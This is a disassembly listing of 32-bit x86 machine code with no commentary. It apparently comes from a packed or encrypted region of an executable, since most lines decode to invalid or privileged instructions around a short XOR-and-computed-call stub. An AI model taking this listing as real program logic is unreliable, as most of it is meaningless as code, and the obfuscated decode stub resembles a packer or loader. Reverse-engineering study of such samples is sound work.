  40ddeb:	fdivr  DWORD PTR es:[edx-0x59fdfa77]
  40ddf2:	mov    eax,ds:0xafbefdf5
  40ddf7:	push   esp
  40ddf8:	icebp  
  40ddf9:	out    dx,eax
  40ddfa:	ret    
  40ddfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddfc:	inc    ebx
  40ddfd:	xor    cl,BYTE PTR [ebx+0x2471a70d]
  40de03:	cmc    
  40de04:	fs (bad) 
  40de06:	dec    eax
  40de07:	push   ss
  40de08:	cmp    esi,ecx
  40de0a:	test   DWORD PTR [eax],ebx
  40de0c:	jecxz  0x40de40
  40de0e:	dec    esp
  40de0f:	xor    ecx,DWORD PTR [ecx-0x766bf144]
  40de15:	inc    ebp
  40de16:	or     BYTE PTR [ebx+0x558be845],cl
  40de1c:	adc    al,0x33
  40de1e:	rol    DWORD PTR [ebx],0xc6
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0xd13e4b3],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40de17
  40de8e:	dec    ebx
  40de8f:	pop    ebp
  40de90:	shl    BYTE PTR [ebx+0x37],cl
  40de93:	dec    esi
  40de94:	out    dx,eax
  40de95:	aas    
  40de96:	inc    ebp
  40de97:	push   esi
  40de98:	out    0x60,eax
  40de9a:	mov    ah,0x7b
  40de9c:	mov    ebx,0x52096c10
  40dea1:	sbb    BYTE PTR [eax+0x28e68e4f],ah
  40dea7:	inc    edx
  40dea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dea9:	sbb    eax,0x2ba5f25c
  40deae:	push   0x282fe23
  40deb3:	fwait
  40deb4:	iret   
  40deb5:	cwde   
  40deb6:	outs   dx,BYTE PTR ds:[esi]
  40deb7:	repnz test al,0x27
  40deba:	in     eax,0x17
  40debc:	push   eax
  40debd:	sar    edx,1
  40debf:	clc    
  40dec0:	in     eax,dx
  40dec1:	jmp    0x3d2d:0xd3334fcc
  40dec8:	leave  
  40dec9:	xor    cl,ah
  40decb:	push   0xb0deb3a9
  40ded0:	mov    dl,0x83
  40ded2:	inc    esp
  40ded3:	cmp    al,0x33
  40ded5:	lods   al,BYTE PTR ds:[esi]
  40ded6:	sub    esi,ecx
  40ded8:	and    esi,ebx
  40deda:	inc    ecx
  40dedb:	pop    eax
  40dedc:	ja     0x40deb5
  40dede:	mov    DWORD PTR ds:0xd24365b3,ebx
  40dee4:	outs   dx,BYTE PTR ds:[esi]
  40dee5:	test   eax,0xc58105e8
  40deea:	adc    BYTE PTR [eax+0x220e9869],0x5d
  40def1:	pusha  
  40def2:	mul    DWORD PTR [edi-0x16]
  40def5:	rcr    DWORD PTR [ebp+0x2a],cl
  40def8:	fld    DWORD PTR [edi-0x52ae3f7e]
  40defe:	test   eax,0x7b61d4f
  40df03:	test   DWORD PTR [esi-0x61],esi
  40df06:	jne    0x40de93
  40df08:	sub    DWORD PTR [ecx+eax*4+0x271d201a],edx
  40df0f:	imul   BYTE PTR [edx]
  40df11:	iret   
  40df12:	sub    edx,DWORD PTR [ebx]
  40df14:	xchg   BYTE PTR [edi-0x39c55beb],bh
  40df1a:	fs pusha 
  40df1c:	aaa    
  40df1d:	add    BYTE PTR [edi],ch
  40df1f:	or     BYTE PTR [eax],ch
  40df21:	push   ecx
  40df22:	and    bh,dh
  40df24:	push   edi
  40df25:	jmp    0x40df07
  40df27:	ins    BYTE PTR es:[edi],dx
  40df28:	jmp    0xfaaa:0xa65e1d10
  40df2f:	mov    esi,0x764fa1ad
  40df34:	or     al,0x13
  40df36:	iret   
  40df37:	cmp    eax,0xc6b331f6
  40df3c:	mov    eax,ds:0xb9d8e9de
  40df41:	cdq    
  40df42:	sbb    bl,BYTE PTR [ebx+0x29323277]
  40df48:	mov    edx,0x68ad2ce5
  40df4d:	jne    0x40df39
  40df4f:	jmp    0x3ea:0x274262e6
  40df56:	into   
  40df57:	xchg   ebx,eax
  40df59:	cmp    BYTE PTR [eax+esi*2+0x31b84d0a],dh
  40df60:	cmp    DWORD PTR [edi+ebp*8],ecx
  40df63:	out    dx,eax
  40df64:	mov    cl,0x1e
  40df66:	call   0x9a372280
  40df6b:	in     al,0xb7
  40df6d:	(bad)  
  40df6e:	sti    
  40df6f:	jmp    esi
  40df71:	inc    eax
  40df72:	rcr    ebp,cl
  40df74:	jle    0x40df2e
  40df76:	jb     0x40df91
  40df78:	sbb    ecx,DWORD PTR [ebp+0x545bf097]
  40df7e:	je     0x40df2c
  40df80:	gs rcl ebp,1
  40df83:	(bad)  
  40df84:	mov    al,0x3
  40df86:	xor    al,ah
  40df88:	add    ah,BYTE PTR [edi-0x1d]
  40df8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df8c:	int3   
  40df8d:	sbb    BYTE PTR [edx+0x69],ch
  40df90:	nop
  40df91:	stc    
  40df92:	push   eax
  40df93:	cli    
  40df94:	mov    ebx,0x871e7e61
  40df99:	loope  0x40dff0
  40df9b:	outs   dx,DWORD PTR ds:[esi]
  40df9c:	mov    bh,0x28
  40df9e:	add    eax,0x6b10685
  40dfa3:	out    0x64,al
  40dfa5:	iret   
  40dfa6:	adc    ebx,DWORD PTR [eax]
  40dfa8:	pop    es
  40dfa9:	(bad)  
  40dfaa:	aaa    
  40dfab:	mov    dh,0xf6
  40dfad:	dec    esi
  40dfae:	sbb    ah,BYTE PTR [edi-0x39e8857b]
  40dfb4:	nop
  40dfb5:	push   ds
  40dfb6:	pop    ds
  40dfb7:	cmp    dl,BYTE PTR [edx+0x2bcb8743]
  40dfbd:	fld    DWORD PTR [edi+0x458b49cb]
  40dfc3:	in     al,0xf
  40dfc5:	scas   eax,DWORD PTR es:[edi]
  40dfc6:	rol    DWORD PTR [ebx],0xe0
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
